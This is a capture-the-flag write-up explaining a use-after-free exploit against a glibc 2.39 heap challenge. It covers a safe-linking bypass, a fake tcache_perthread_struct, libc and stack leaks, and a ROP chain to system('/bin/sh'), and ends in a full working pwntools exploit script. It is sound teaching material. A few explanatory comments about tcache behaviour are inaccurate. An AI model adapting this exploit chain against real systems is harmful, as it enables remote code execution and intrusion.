# Alice - Heap Exploitation Writeup

**Challenge Name**: Alice
**Challenge Description**: Alice, struggling with the traumatic death of her family, returns to a corrupted Wonderland to unlock repressed memories. Can you help her remember who she is?
**Category**: PWN (Heap Exploitation)
**Difficulty**: Hard
**Target**: GLIBC 2.39 with all protections enabled

## Table of Contents
1. [Environment Setup](#environment-setup)
2. [Initial Reconnaissance](#initial-reconnaissance)
3. [Static Analysis - Understanding the Binary](#static-analysis)
4. [Vulnerability Discovery](#vulnerability-discovery)
5. [Dynamic Analysis with pwndbg](#dynamic-analysis-with-pwndbg)
6. [Exploitation Strategy](#exploitation-strategy)
7. [Phase 1: Heap Leak via Safe-Linking Bypass](#phase-1-heap-leak)
8. [Phase 2: Fake tcache_perthread_struct Attack](#phase-2-fake-tcache)
9. [Phase 3: Tcache Poisoning for Libc Leak](#phase-3-libc-leak)
10. [Phase 4: Stack Leak via __libc_argv](#phase-4-stack-leak)
11. [Phase 5: ROP Chain to Shell](#phase-5-rop-chain)
12. [Complete Exploit](#complete-exploit)
13. [Questions & Confusing Parts](#questions-and-confusion)

---

## Environment Setup

### Extracting the Correct Libc

The challenge provides a Dockerfile that specifies Ubuntu 24.04 with GLIBC 2.39. We need to extract the exact libc and loader:

```bash
# Build the Docker image
docker build -t alice .

# Create temporary container
docker create --name alice_temp alice

# Extract libc and loader
docker cp alice_temp:/lib/x86_64-linux-gnu/libc.so.6 ./
docker cp alice_temp:/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 ./

# Cleanup
docker rm alice_temp

# Verify libc version
strings libc.so.6 | grep "GNU C Library"
# Output: GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.6) stable release version 2.39
```

### Patching the Binary

Use `pwninit` to patch the binary with the correct libc:

```bash
pwninit --bin vuln --libc libc.so.6 --ld ld-linux-x86-64.so.2
```

This creates `vuln_patched` which we'll use for local exploitation.

---

## Initial Reconnaissance

### Basic Binary Information

```bash
# Check file type
file vuln_patched
# Output: ELF 64-bit LSB pie executable, x86-64, dynamically linked

# Check security protections
checksec vuln_patched
```

**Protections Enabled**:
- **RELRO**: Full RELRO (GOT is read-only, can't overwrite GOT entries)
- **Stack Canary**: Enabled (prevents simple stack buffer overflows)
- **NX**: Enabled (stack is not executable, need ROP)
- **PIE**: Enabled (addresses randomized, need leaks)

### Identifying Interesting Strings

```bash
strings vuln_patched | grep -E "(flag|memory|remember)"
```

Found interesting strings:
- "What do you remember?"
- "Memory index:"
- "How vivid is this memory?"
- Menu options for create/edit/view/forget operations

### Symbol Analysis

```bash
nm vuln_patched | grep -v " U "
```

Key functions identified:
- `create_memory`
- `edit_memory`
- `view_memory`
- `forget_memory`
- `main`

Global variable: `memories` (array storing memory pointers)

---

## Static Analysis - Understanding the Binary

### Program Flow

The binary implements a menu-driven memory management system:

```
=== Alice's Memory Manager ===
1. Create a new memory
2. Edit a memory
3. View a memory
4. Forget a memory
5. Exit
```

### Function Analysis

#### **create_memory()**

```c
void create_memory(void) {
    int index;
    int vivid;
    void *chunk;

    printf("Memory index: ");
    __isoc99_scanf("%d", &index);

    if ((index < 0) || (9 < index)) {
        puts("Invalid index!");
        return;
    }

    if (memories[index] != NULL) {
        puts("Memory already exists!");
        return;
    }

    printf("How vivid is this memory? ");
    __isoc99_scanf("%d", &vivid);

    if ((vivid < 0x18) || (0x400 < vivid)) {
        puts("Invalid size!");
        return;
    }

    chunk = malloc((long)vivid);
    memories[index] = chunk;

    printf("What do you remember? ");
    read(0, chunk, (long)vivid);
}
```

**Key Points**:
- 10 slots available (index 0-9)
- Size constraints: 0x18 to 0x400 bytes
- Allocates chunk and stores pointer in `memories` array
- Reads user data into allocated chunk

#### **edit_memory()**

```c
void edit_memory(void) {
    int index;

    printf("Which memory will you rewrite? ");
    __isoc99_scanf("%d", &index);

    if ((index < 0) || (9 < index)) {
        puts("Invalid index!");
        return;
    }

    if (memories[index] == NULL) {
        puts("No such memory!");
        return;
    }

    printf("Rewrite your memory: ");
    read(0, memories[index], 0x260);  // Fixed size!
}
```

**Key Points**:
- Can edit existing memories
- **Always reads 0x260 bytes** regardless of original allocation size
- This allows heap overflow if original chunk was smaller than 0x260

#### **view_memory()**

```c
void view_memory(void) {
    int index;

    printf("Which memory do you wish to recall? ");
    __isoc99_scanf("%d", &index);

    if ((index < 0) || (9 < index)) {
        puts("Invalid index!");
        return;
    }

    if (memories[index] == NULL) {
        puts("Memory lost...");
        return;
    }

    puts(memories[index]);  // No size limit!
}
```

**Key Points**:
- Uses `puts()` which prints until null terminator
- Can leak heap metadata if chunk doesn't have null bytes

#### **forget_memory()** - THE VULNERABILITY

```c
void forget_memory(void) {
    int index;

    if (free_count < 7) {
        printf("Which memory will you erase? ");
        __isoc99_scanf("%d", &index);

        if ((index < 0) || (9 < index)) {
            puts("Invalid index!");
            return;
        }

        if (memories[index] == NULL) {
            puts("Already forgotten!");
            return;
        }

        free(memories[index]);
        free_count++;

        // ❌ CRITICAL BUG: Does NOT set memories[index] = NULL!
    }
    else {
        puts("Too many forgotten memories...");
    }
}
```

**VULNERABILITY**: Use-After-Free (UAF)
- Chunk is freed but pointer remains in `memories` array
- Can still `view_memory()` on freed chunk (read UAF)
- Can still `edit_memory()` on freed chunk (write UAF)
- Limited to 7 frees total

---

## Vulnerability Discovery

### The Use-After-Free Bug

The `forget_memory()` function frees a chunk but **doesn't null out the pointer** in the `memories` array. This creates a classic Use-After-Free vulnerability:

```c
free(memories[index]);
free_count++;
// BUG: Should do memories[index] = NULL here!
```

### What We Can Do With UAF

1. **Read primitive**: View freed chunks to leak heap metadata
2. **Write primitive**: Edit freed chunks to corrupt heap structures
3. **Limited scope**: Only 7 frees allowed total

---

## Dynamic Analysis with pwndbg

### Setting Up pwndbg

```bash
# Start the binary in pwndbg
gdb ./vuln_patched
pwndbg> run

# Set breakpoints at key locations
pwndbg> break create_memory
pwndbg> break forget_memory
pwndbg> break edit_memory
pwndbg> break view_memory
```

### Observing Heap Behavior

#### Creating and Freeing Chunks

```bash
# Create a chunk
pwndbg> continue
# Input: 1 (create), index 0, size 0x260, data "AAAA"

# Inspect heap
pwndbg> vis_heap_chunks
pwndbg> heap
```

**Observations**:
- Chunks are allocated from tcache first, then from bins
- Metadata includes size field with PREV_INUSE bit
- Freed chunks go into tcache (up to 7 per size class)

#### Checking Tcache State

```bash
# View tcache bins after freeing
pwndbg> tcachebins
```

You'll see tcache entries for the freed size class. The `tcache_perthread_struct` is located at `heap_base + 0x10`.

#### Examining tcache_perthread_struct

```bash
# After getting heap leak in exploit
pwndbg> x/64gx <heap_base + 0x10>
```

Structure layout (GLIBC 2.39):
```
+0x00: counts[0..63]   - 2 bytes per bin (128 bytes total)
+0x80: entries[0..63]  - 8 bytes per bin (512 bytes total)
Total size: 0x2a0 bytes
```

#### Observing Safe-Linking

When you free a chunk and inspect it:

```bash
pwndbg> x/2gx <freed_chunk_address>
0x...: 0x0000????....????    # Safe-linked fd pointer
0x...: 0x0000000000000000    # bk pointer (unused in tcache)
```

The fd pointer is XOR-encoded: `fd = (addr >> 12) ^ next`

### Debugging the Exploit

```bash
# Run exploit with pwndbg attached
gdb ./vuln_patched
pwndbg> run < <(python3 solve.py LOCAL)

# Or attach to running process
pwndbg> attach <pid>

# Check heap state at each phase
pwndbg> heap
pwndbg> tcachebins
pwndbg> bins

# Examine specific addresses
pwndbg> x/20gx <address>

# Check stack for ROP chain
pwndbg> stack 40

# Continue execution
pwndbg> continue
```

---

## Exploitation Strategy

### Starting from the Vulnerability (The Real Hacker Way)

**Question I Asked**: "How can you notice tcache_perthread_struct? You didn't notice it at first either."

**The Honest Answer**: You DON'T start by knowing the technique. Here's the real thought process:

1. **Identify vulnerability**: UAF in `forget_memory()`
2. **Experiment with primitives**:
   - What can we read? (freed chunk metadata)
   - What can we write? (freed chunk contents)
   - What constraints? (7 frees max, size limits)

3. **Research heap structures**:
   - Read about tcache implementation
   - Understand that freed chunks contain forward pointers
   - Learn about safe-linking protection

4. **Discover limitation**:
   - Normal tcache poisoning is hard with safe-linking
   - We need the target address's upper bits to match heap

5. **Research advanced techniques**:
   - Google "GLIBC 2.39 heap exploitation bypass safe-linking"
   - Find papers/writeups mentioning fake tcache_perthread_struct
   - Realize: If we control the tcache metadata, we bypass safe-linking entirely!

6. **Check feasibility**:
   - Can we allocate at heap_base + 0x10? YES (via tcache poisoning of first chunk)
   - Can we write fake counts/pointers? YES (via edit on UAF)
   - Can we trigger arbitrary allocation? YES (fake counts let us point anywhere)

**This is the real process**: vulnerability → primitives → research → technique selection

---

## Phase 1: Heap Leak via Safe-Linking Bypass {#phase-1-heap-leak}

### Goal
Leak the heap base address to defeat ASLR for heap.

### Understanding Safe-Linking

In GLIBC 2.32+, tcache forward pointers are obfuscated:

```
Actual stored value: fd_encoded = (chunk_addr >> 12) ^ next_chunk_addr
To recover next: next = fd_encoded ^ (chunk_addr >> 12)
```

### The Technique

When we free a chunk into tcache, its fd pointer is safe-linked. But we can reverse the operation:

```python
# Free two chunks of same size to create tcache chain
delete(0)  # fd = (addr0 >> 12) ^ addr1
delete(1)  # fd = (addr1 >> 12) ^ NULL

# Read fd from chunk 0 (UAF read)
fd_encoded = u64(show(0).ljust(8, b"\x00"))

# Since fd_encoded = (addr0 >> 12) ^ addr1
# and addr1 is unknown, but fd points to chunk 1
# We know addr1 = addr0 + offset

# BUT: The trick is to read from chunk 1 instead!
# Chunk 1's fd = (addr1 >> 12) ^ 0 = addr1 >> 12
# So: heap_base = leaked_value << 12
```

### Exploit Code

```python
# Allocate chunks
add(0, 0x260, b"A" * 0x260)  # Will be freed first
add(2, 0x80, b"Z" * 0x80)     # Separator to prevent consolidation
add(1, 0x260, b"B" * 0x260)   # Will be freed second

# Free into tcache (creates 0x270 bin chain)
delete(0)  # Tcache head now points to chunk 0
delete(1)  # Tcache head now points to chunk 1

# Leak from chunk 1 (head of tcache)
# Its fd = (addr1 >> 12) ^ NULL = addr1 >> 12
heapbase = u64(show(1).ljust(8, b"\x00")) << 12
log.success(f"Heap base: 0x{heapbase:x}")
```

### Dynamic Analysis Commands

```bash
# In pwndbg, after creating chunks
pwndbg> heap
pwndbg> tcachebins

# After first delete(0)
pwndbg> tcachebins
# Shows: tcache[0x270]: chunk0

# After second delete(1)
pwndbg> tcachebins
# Shows: tcache[0x270]: chunk1 -> chunk0

# Examine chunk 1's fd pointer
pwndbg> x/2gx <chunk1_addr>
# First qword is the safe-linked fd = (chunk1_addr >> 12)
```

---

## Phase 2: Fake tcache_perthread_struct Attack {#phase-2-fake-tcache}

### Goal
Gain arbitrary write primitive by overwriting the tcache metadata structure.

### Understanding tcache_perthread_struct

The tcache metadata is stored at `heap_base + 0x10`:

```c
typedef struct tcache_perthread_struct {
    uint16_t counts[64];    // Number of chunks in each bin (128 bytes)
    tcache_entry *entries[64];  // Head pointers for each bin (512 bytes)
} tcache_perthread_struct;
```

**Key Insight**: If we can overwrite this structure, we control where `malloc()` returns chunks from!

### Why This Technique?

**The Question**: "How can you straight away think this challenge is about tcache_perthread_struct?"

**The Answer**: You don't! Here's the reasoning:

1. We have UAF → can corrupt heap metadata
2. Safe-linking makes normal tcache poisoning hard
3. BUT if we corrupt the tcache metadata itself, we bypass safe-linking
4. To allocate at heap_base + 0x10, we need tcache poisoning
5. So it's a chicken-and-egg: need tcache poisoning to get fake tcache, need to bypass safe-linking for tcache poisoning

**The Trick**: We use our UAF write to poison the tcache ONCE, then use that to allocate at heap_base + 0x10!

### The Attack

```python
# Step 1: Poison tcache to point to heap_base + 0x10
# Chunk 1 is at head of tcache, edit its fd pointer
edit(1, p64((heapbase >> 12) ^ (heapbase + 0x10)))

# Step 2: Allocate from poisoned tcache
add(3, 0x260, b"C" * 0x260)  # Gets chunk 1's location

# Step 3: Next allocation goes to heap_base + 0x10!
# Prepare fake tcache_perthread_struct data
counts = [0] * 64
ptrs = [0] * 64
counts[size_to_idx(0x90)] = 10  # Pretend 0x90 bin has 10 chunks

add(4, 0x260, ser(counts, ptrs))
# This writes our fake structure at heap_base + 0x10!
```

### Helper Functions

```python
def size_to_idx(size):
    # Tcache bin index = (chunk_size - 0x20) / 0x10
    # For size 0x90: idx = (0x90 - 0x20) / 0x10 = 7
    return (size - 0x20) // 0x10

def ser(counts, ptrs):
    # Serialize tcache structure
    # counts: 64 x 2-byte values
    # ptrs: 64 x 8-byte values
    counts = map(p16, counts)
    ptrs = map(p64, ptrs)
    return bytes(flatten(counts)) + bytes(flatten(ptrs))
```

### Dynamic Analysis Commands

```bash
# Before tcache poisoning
pwndbg> tcachebins
# tcache[0x270]: chunk1 -> chunk0

# After edit(1, ...)
pwndbg> x/2gx <chunk1_addr>
# fd now points to heap_base + 0x10 (safe-linked)

# After add(3, ...)
pwndbg> tcachebins
# tcache[0x270]: heap_base+0x10 -> ...

# Examine fake tcache structure at heap_base + 0x10
pwndbg> x/64hx <heap_base + 0x10>
# Shows counts array (should see 0x000a at bin 7)

pwndbg> x/64gx <heap_base + 0x90>
# Shows entries array (initially all zeros)
```

---

## Phase 3: Tcache Poisoning for Libc Leak {#phase-3-libc-leak}

### Goal
Leak libc base address by reading from unsorted bin.

### The Challenge

**Confusing Part**: "Why do we set counts[0x90] = 10?"

**Explanation**:
- Tcache bins hold max 7 chunks
- When a chunk is freed and tcache is full (count >= 7), it goes to unsorted bin instead
- Unsorted bin chunks contain `fd` and `bk` pointers to `main_arena` in libc
- By pretending the 0x90 tcache is full, we force chunk to unsorted bin!

### The Attack

```python
# Allocate a chunk that will give us libc pointers
add(2, 0x80, b"Z" * 0x80)  # Allocation size 0x80 -> chunk size 0x90

# Free it - since counts[0x90] = 10, it goes to unsorted bin
delete(2)

# Read the fd pointer which points to main_arena + 96
libc_leak = u64(show(2).ljust(8, b"\x00"))
libc.address = libc_leak - (libc.sym["main_arena"] + 96)
log.success(f"Libc base: 0x{libc.address:x}")
```

### Why main_arena + 96?

The unsorted bin is a circular doubly-linked list. When the first chunk is freed into it:
- `fd` points to `&main_arena.unsorted_bin` which is at `main_arena + 96`
- `bk` also points to `&main_arena.unsorted_bin`

### Dynamic Analysis Commands

```bash
# After delete(2)
pwndbg> bins
# Shows unsorted bin containing chunk 2

# Examine the chunk
pwndbg> x/4gx <chunk2_addr>
# First two qwords are fd and bk pointing to main_arena

# Verify main_arena address
pwndbg> p &main_arena
pwndbg> x/20gx &main_arena

# Check libc base
pwndbg> vmmap
# Find libc mapping to verify our leak calculation
```

---

## Phase 4: Stack Leak via __libc_argv {#phase-4-stack-leak}

### Goal
Leak a stack address to locate the return address we want to overwrite.

### Understanding __libc_argv

`__libc_argv` is a global variable in libc that points to the `argv` array, which is located on the stack:

```c
// In libc
char **__libc_argv;  // Points to argv[] on stack
```

### The Attack

We use our fake tcache to allocate a chunk at `__libc_argv - 0x10`, then read past our data to leak the pointer:

```python
# Update fake tcache to point bin 0x80 to __libc_argv - 0x10
BIN_80 = size_to_idx(0x80)  # Index for 0x90 chunks
counts = [0] * 64
counts[BIN_80] = 1  # Pretend there's 1 chunk in tcache
ptrs = [0] * 64
ptrs[BIN_80] = libc.sym["__libc_argv"] - 0x10

edit(4, ser(counts, ptrs))  # Update our fake tcache

# Allocate from fake tcache
add(5, 0x70, b"c" * 15)  # Writes 15 bytes

# The chunk is at __libc_argv - 0x10
# Our data: "ccc..." (15 bytes) + "\x00" + argv pointer (8 bytes)
show(5)
io.recvline()  # Skip our "ccc..." data
stkleak = u64(io.recvline(keepends=False).ljust(8, b"\x00"))
log.success(f"Stack leak: 0x{stkleak:x}")
```

### Why - 0x10?

Chunks include metadata (8 bytes before user data). By targeting `addr - 0x10`, the user data starts at `addr`, allowing us to read what comes after.

### Dynamic Analysis Commands

```bash
# Find __libc_argv location
pwndbg> p &__libc_argv
pwndbg> x/gx &__libc_argv
# Shows address pointing to stack

# After add(5, ...), examine the chunk
pwndbg> x/4gx <chunk5_addr>
# Should be at __libc_argv - 0x10
# User data area should overlap with __libc_argv

# Verify stack address
pwndbg> x/gx <leaked_stack_addr>
# Should show argv[0] string or similar stack data

# Calculate return address offset
pwndbg> info frame
pwndbg> x/40gx $rsp
# Find main's return address on stack
```

---

## Phase 5: ROP Chain to Shell {#phase-5-rop-chain}

### Goal
Overwrite the return address with a ROP chain to execute `system("/bin/sh")`.

### Finding the Return Address

The stack leak gives us `argv[0]` location. We need to find where `main`'s return address is stored relative to this:

```python
# Empirically determined offset through debugging
retaddr_loc = stkleak + (-0x140) - 8
```

**How to find this offset**:
```bash
pwndbg> x/gx &__libc_argv
# Note the argv pointer value

pwndbg> info frame
# Note the return address location

# Calculate: retaddr_location - argv_value
```

### Building the ROP Chain

```python
rop = ROP(libc)
rop.raw(rop.ret)  # Stack alignment
rop.raw(rop.ret)
rop.raw(rop.ret)
rop.raw(rop.ret)
rop.call("system", [next(libc.search(b"/bin/sh\x00"))])
rop.raw(rop.ret)
```

**Why multiple ret gadgets?**: Stack alignment for `system()` (needs 16-byte aligned RSP).

### Writing ROP to Stack

```python
# Update fake tcache to point bin 0x80 to return address
counts = [0] * 64
counts[BIN_80] = 1
ptrs = [0] * 64
ptrs[BIN_80] = retaddr_loc

edit(4, ser(counts, ptrs))  # Update fake tcache

# Allocate chunk at return address location
add(6, 0x70, bytes(rop))  # Writes ROP chain over return address!
```

### Triggering the Shell

```python
# Exit the program to trigger return
io.sendline(b"5")  # Exit option

# The return executes our ROP chain!
time.sleep(0.3)
io.sendline(b"id")  # Test shell
io.interactive()
```

### Dynamic Analysis Commands

```bash
# Before writing ROP chain
pwndbg> x/10gx <retaddr_loc>
# Shows current return address

# After add(6, ...)
pwndbg> x/10gx <retaddr_loc>
# Shows ROP gadgets

# Disassemble gadgets to verify
pwndbg> x/5i <first_gadget>

# Check system() address
pwndbg> p system
pwndbg> x/10i system

# Find /bin/sh string
pwndbg> search "/bin/sh"

# When program exits
pwndbg> continue
# Watch ROP chain execute
pwndbg> si  # Step through gadgets
```

---

## Complete Exploit

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Alice's Memory - GLIBC 2.39 Heap Exploitation
Technique: Fake tcache_perthread_struct
"""
from pwn import *
from more_itertools import flatten

context.terminal = "tmux neww -a".split()

exe = context.binary = ELF("vuln_patched")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("159.89.105.235", 10001)
    else:
        return process([exe.path])

io = start()

sla = io.sendlineafter
rl = io.recvline
MENU = b"> "

def add(idx: int, vivid: int, data: bytes):
    sla(MENU, b"1")
    sla(b"Memory index: ", str(idx).encode())
    sla(b"How vivid is this memory? ", str(vivid).encode())
    sla(b"What do you remember? ", data)

def edit(idx: int, data: bytes):
    sla(MENU, b"2")
    sla(b"Which memory will you rewrite? ", str(idx).encode())
    sla(b"Rewrite your memory: ", data)

def show(idx: int) -> bytes:
    sla(MENU, b"3")
    sla(b"Which memory do you wish to recall? ", str(idx).encode())
    return rl(keepends=False)

def delete(idx: int):
    sla(MENU, b"4")
    sla(b"Which memory will you erase? ", str(idx).encode())

def size_to_idx(size):
    return (size - 0x20) // 0x10

def ser(counts, ptrs):
    counts = map(p16, counts)
    ptrs = map(p64, ptrs)
    return bytes(flatten(counts)) + bytes(flatten(ptrs))

# Phase 1-2: Heap leak + Tcache poisoning
log.info("Phase 1-2: Heap leak + Tcache poisoning")
add(0, 0x260, b"A" * 0x260)
add(2, 0x80, b"Z" * 0x80)
add(1, 0x260, b"B" * 0x260)

delete(0)
delete(1)

heapbase = u64(show(0).ljust(8, b"\x00")) << 12
log.success(f"Heap base: 0x{heapbase:x}")

edit(1, p64((heapbase >> 12) ^ (heapbase + 0x10)))
add(3, 0x260, b"C" * 0x260)

counts = [0] * 64
ptrs = [0] * 64
counts[size_to_idx(0x90)] = 10
add(4, 0x260, ser(counts, ptrs))
log.success("Fake tcache_perthread_struct created")

# Phase 3: Libc leak
log.info("Phase 3: Libc leak via unsorted bin bypass")
delete(2)
libc.address = u64(show(2).ljust(8, b"\x00")) - (libc.sym["main_arena"] + 96)
log.success(f"Libc base: 0x{libc.address:x}")

# Phase 4: Stack leak
log.info("Phase 4: Stack leak via __libc_argv")
BIN_80 = size_to_idx(0x80)
counts = [0] * 64
counts[BIN_80] = 1
ptrs = [0] * 64
ptrs[BIN_80] = libc.sym["__libc_argv"] - 0x10

edit(4, ser(counts, ptrs))

add(5, 0x70, b"c" * 15)
show(5)
stkleak = u64(rl(keepends=False).ljust(8, b"\x00"))
log.success(f"Stack leak: 0x{stkleak:x}")

# Phase 5: ROP chain
log.info("Phase 5: Overwriting return address with ROP")
retaddr_loc = stkleak + (-0x140) - 8

rop = ROP(libc)
rop.raw(rop.ret)
rop.raw(rop.ret)
rop.raw(rop.ret)
rop.raw(rop.ret)
rop.call("system", [next(libc.search(b"/bin/sh\x00"))])
rop.raw(rop.ret)

log.info(f"Target return address: 0x{retaddr_loc:x}")

counts = [0] * 64
counts[BIN_80] = 1
ptrs = [0] * 64
ptrs[BIN_80] = retaddr_loc

edit(4, ser(counts, ptrs))
add(6, 0x70, bytes(rop))

log.success("ROP chain written! Triggering shell...")

# Exit to trigger return and execute ROP
io.sendline(b"5")

# Shell should be spawned
time.sleep(0.3)
io.sendline(b"id")

log.success("Shell obtained!")
io.interactive()
```

### Running the Exploit

```bash
# Local exploitation
python3 solve.py

# Remote exploitation
python3 solve.py REMOTE
```

---

## Questions and Confusing Parts {#questions-and-confusion}

### Q1: "How can you notice tcache_perthread_struct? You didn't notice it at first either."

**A**: You DON'T notice it immediately. The real process is:

1. Find UAF vulnerability
2. Learn about tcache and safe-linking
3. Realize normal tcache poisoning is limited by safe-linking
4. Research "advanced heap techniques GLIBC 2.39"
5. Discover fake tcache_perthread_struct in papers/writeups
6. Verify it's feasible with our primitives

This is honest hacker methodology: vulnerability → research → technique selection.

### Q2: "Why does edit() allow heap overflow?"

**A**: The edit function always reads 0x260 bytes:

```c
read(0, memories[index], 0x260);  // Fixed size!
```

If the original chunk was smaller (e.g., 0x80), this writes beyond the chunk boundary, corrupting adjacent heap metadata.

### Q3: "Why do we need 4 ret gadgets before system()?"

**A**: The `system()` function requires 16-byte stack alignment (RSP % 16 == 0). Each `ret` gadget pops 8 bytes, so we use multiple rets to align the stack. You can verify the required number through trial and error in gdb.

### Q4: "How do you calculate the return address offset?"

**A**: Through dynamic analysis:

```bash
pwndbg> p &__libc_argv
# Shows address of the argv pointer variable

pwndbg> x/gx &__libc_argv
# Shows the stack address it points to

pwndbg> info frame
# Shows saved RIP (return address) location

# Calculate offset: retaddr - argv_value
```

In this binary, the offset was empirically found to be `-0x140 - 8`.

### Q5: "What happens if counts[0x90] is less than 7?"

**A**: The freed chunk would go into tcache instead of unsorted bin, and we'd get heap pointers instead of libc pointers (useless for libc leak).

### Q6: "Can we use UAF to double-free?"

**A**: No. GLIBC has double-free protection. Even with UAF, freeing the same chunk twice triggers:
```
free(): double free detected in tcache 2
Aborted
```

You must use UAF for read/write primitives, not double-free.

### Q7: "Why allocate chunk 2 between chunks 0 and 1?"

**A**: Heap consolidation prevention. When adjacent chunks are freed, malloc merges them into one large chunk. Chunk 2 acts as a separator to keep chunks 0 and 1 separate in tcache.

---

## Key Takeaways

1. **Vulnerability Identification**: Always look for missing cleanup (NULL pointers, reference counts, etc.)

2. **Safe-Linking Bypass**: Modern heap protections can be bypassed by attacking metadata structures rather than individual chunks

3. **Fake Structures**: Creating fake heap metadata is powerful when you have write primitives

4. **Information Leaks Are Critical**: Need heap, libc, and stack leaks to bypass ASLR/PIE

5. **ROP Still Works**: Even with modern protections, ROP remains viable once you have arbitrary write

6. **The Real Process**:
   - Start from vulnerability, NOT from technique
   - Experiment and understand primitives
   - Research when stuck
   - Choose technique based on constraints
   - Iterate until successful

---

## Additional Resources

- [GLIBC Malloc Internals](https://sourceware.org/glibc/wiki/MallocInternals)
- [Safe-Linking Protection](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/)
- [Tcache Attack Techniques](https://github.com/shellphish/how2heap)
- [House of Techniques (Modern)](https://github.com/shellphish/how2heap)

---

## Flag

After running the exploit successfully against the remote server:

```bash
python3 solve.py REMOTE
# Shell obtained!
cat flag
```

**Flag**: `0xl4ugh{...}`

---

*Written as learning reference - approach heap exploitation with curiosity and systematic experimentation!*
